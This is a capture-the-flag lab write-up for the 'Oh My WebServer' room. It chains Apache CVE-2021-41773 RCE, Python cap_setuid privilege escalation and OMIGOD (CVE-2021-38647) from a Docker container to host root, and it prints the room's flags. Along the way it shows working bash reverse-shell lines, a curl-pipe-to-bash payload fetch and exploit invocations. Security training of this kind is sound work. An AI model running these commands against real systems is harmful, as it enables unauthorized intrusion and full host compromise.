# Oh My WebServer 

### Difficulty: Medium

### Description

This room is a great example of **chaining vulnerabilities across multiple layers of a system**.

The attack path is:

**Apache enumeration → CVE-2021-41773 RCE → reverse shell → Linux capability abuse → container root → Docker host enumeration → CVE-2021-38647 (OMIGOD) → host root → final flag**

The interesting part is that getting `root` inside the container is **not the end of the attack**. The container provides a foothold for reaching a vulnerable service on the underlying host.

---

# 🔍 1. Reconnaissance

We begin with a service/version scan:

```bash
nmap -sV 10.128.141.215
```

The scan returns:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
```

We have:

- **22/tcp — SSH**
    
- **80/tcp — Apache HTTP**
    

The Apache version immediately stands out:

```text
Apache 2.4.49
```

Apache **2.4.49** is associated with **CVE-2021-41773**, a path traversal vulnerability that can also lead to RCE under particular configurations.

So rather than spending time attacking SSH without credentials, we investigate the web server first.

---

# 💥 2. Exploiting CVE-2021-41773

The vulnerable Apache configuration allows the path traversal issue to be escalated into command execution.

A public proof-of-concept is used to test whether commands can be executed against the target.

After saving the exploit as `exploit.sh`:

```bash
chmod +x exploit.sh
```

A target file is created containing the target IP, and the exploit is executed:

```bash
./exploit.sh targets.txt /bin/sh whoami
```

The response is:

```text
----------------------------------------
Target: 10.128.141.215
----------------------------------------
daemon
```

### Result

The command executed successfully.

We are now executing commands remotely as:

```text
daemon
```

That's our initial foothold.

---

# 🐚 3. Getting a Reverse Shell

With RCE confirmed, the next objective is to turn individual command execution into an interactive shell.

A listener is started on the attacking machine:

```bash
nc -lnvp 9050
```

The vulnerable Apache instance is then instructed to execute a reverse-shell command.

```bash
./exploit.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.136.243/9050 0>&1'"
```

The connection comes back to our listener.

We now have an interactive shell as:

```text
daemon
```

At this point, the focus changes from **initial access** to **local privilege escalation**.

---

# 🐍 4. Enumerating Linux Capabilities

One useful privilege-escalation check is looking for binaries with unusual Linux capabilities.

We run:

```bash
getcap -r / 2>/dev/null
```

The important result is:

```text
/usr/bin/python3.7 = cap_setuid+ep
```

This is a major finding.

### What does `cap_setuid` mean?

Linux capabilities split some of the privileges traditionally associated with root into individual permissions.

`CAP_SETUID` allows a process to change its user ID.

Here, Python has:

```text
cap_setuid+ep
```

meaning the capability is both permitted and effective when the binary runs.

Because Python is an interpreter, this can be abused to change the process UID to `0` — root.

---

# 👑 5. Python Capability Privilege Escalation

We can use Python to change the current process's UID:

```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Checking our privileges now shows that we've obtained a root shell.

However, there's an important detail:

> **This root shell is inside a Docker container.**

So although we have root privileges in the container, we don't necessarily have root privileges on the underlying host.

The first flag is located inside the container:

```text
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```

🏁 **Container flag:**

```text
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```

---

# 🐳 6. Enumerating the Docker Environment

Now we need to understand where the container sits in the network.

A useful technique from inside a restricted container is to identify the Docker gateway and scan it for accessible services.

The environment doesn't necessarily contain all the tools we want, so a static Nmap binary can be transferred into `/tmp`.

On the attacking machine:

```bash
python3 -m http.server 80
```

Inside the container:

```bash
cd /tmp
curl -O http://192.168.136.243/nmap
chmod +x nmap
```

We then scan the Docker gateway:

```bash
./nmap -p- 172.17.0.1 --min-rate=700 -vvv
```

The interesting result is:

```text
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
```

Port **5986** is particularly interesting.

Normally, ports 5985/5986 are associated with Windows Remote Management, but on this Linux host, 5986 points toward **Open Management Infrastructure (OMI)**.

That gives us another potential attack surface.

---

# 🔓 7. Exploiting OMIGOD — CVE-2021-38647

The next vulnerability is:

```text
CVE-2021-38647
```

commonly known as **OMIGOD**.

It affects Microsoft's **Open Management Infrastructure (OMI)** agent on Linux.

Under vulnerable configurations, the service can allow unauthenticated command execution with extremely high privileges.

The important part of this room is the network positioning:

```text
Internet-facing Apache
        ↓
Apache RCE
        ↓
Docker container
        ↓
Container root
        ↓
Docker gateway
        ↓
OMI on host
        ↓
Host root
```

So the container isn't directly exploited to "break Docker." Instead, we use our access inside the container to reach another vulnerable service exposed by the host.

---

# 🧨 8. Preparing the OMI Exploit

A public proof-of-concept is downloaded onto the attacking machine:

```bash
curl -s https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/main/omigod.py -o omi.py
```

A shell payload is prepared:

```bash
echo 'bash -i >& /dev/tcp/192.168.136.243/4444 0>&1' > shell.sh
```

The files are hosted using a temporary HTTP server:

```bash
python3 -m http.server 8000
```

The exploit is then transferred into the container:

```bash
curl -O http://192.168.136.243:8000/omi.py
```

A listener is started on the attacking machine:

```bash
nc -lnvp 4444
```

The exploit is aimed at the Docker host:

```bash
python3 omi.py -t 172.17.0.1 -c "curl http://192.168.136.243:8000/shell.sh | bash"
```

---

# 👑 9. Host Root

The exploit succeeds.

Instead of receiving another shell as `daemon` or as the container's root user, the callback gives us a shell running with **root privileges on the underlying host**.

We can now access:

```text
/root
```

and retrieve:

```text
root.txt
```

The final flag is:

```text
THM{7f147ef1f36da9ae29529890a1b6011f}
```

🏁 **Final flag:**

```text
THM{7f147ef1f36da9ae29529890a1b6011f}
```

---

# 🧠 Full Attack Chain

```text
                    TARGET
                       │
                       ▼
              Nmap version scan
                       │
                       ▼
             Apache 2.4.49 found
                       │
                       ▼
             CVE-2021-41773
                       │
                       ▼
                  Apache RCE
                       │
                       ▼
                Reverse shell
                  as daemon
                       │
                       ▼
             getcap -r / 2>/dev/null
                       │
                       ▼
       Python3.7 = cap_setuid+ep
                       │
                       ▼
                Python abuse
                       │
                       ▼
             ROOT INSIDE CONTAINER
                       │
                       ▼
              Scan Docker gateway
                       │
                       ▼
                  Port 5986
                       │
                       ▼
             OMI service discovered
                       │
                       ▼
             CVE-2021-38647
                  "OMIGOD"
                       │
                       ▼
               ROOT ON HOST
                       │
                       ▼
                 root.txt
                       │
                       ▼
       THM{7f147ef1f36da9ae29529890a1b6011f}
```

---

# 🏁 Flags

|Location|Flag|
|---|---|
|Container|`THM{eacffefe1d2aafcc15e70dc2f07f7ac1}`|
|Host `/root/root.txt`|`THM{7f147ef1f36da9ae29529890a1b6011f}`|

---

# 🔥 What This Room Teaches

### 1. **Version enumeration matters**

The first Nmap scan essentially tells us where to look:

```text
Apache 2.4.49
```

Knowing the exact service version allows us to investigate relevant CVEs rather than blindly throwing exploits at the machine.

### 2. **RCE doesn't automatically mean root**

The Apache vulnerability initially gives us:

```text
daemon
```

We still need local privilege escalation.

### 3. **Linux capabilities deserve attention**

This finding is the key:

```text
/usr/bin/python3.7 = cap_setuid+ep
```

A capability attached to an interpreter can be especially dangerous because the interpreter can perform privileged operations on our behalf.

### 4. **Root inside a container isn't necessarily host root**

This is probably the biggest lesson of the room.

Getting:

```text
root@container
```

doesn't automatically mean:

```text
root@host
```

We have to understand the container's network and what services the host exposes to it.

### 5. **Always investigate the Docker gateway**

The scan of:

```text
172.17.0.1
```

revealed the service that ultimately allowed the container-to-host compromise.

### 6. **Infrastructure vulnerabilities can be chained**

The final attack isn't based on one vulnerability.

It's the combination of:

```text
CVE-2021-41773
        +
Linux capability misconfiguration
        +
CVE-2021-38647
```

that produces complete host compromise.

**The biggest takeaway:** a container can reduce the impact of an initial compromise, but vulnerable services exposed by the host can provide a path from **container access → host compromise**.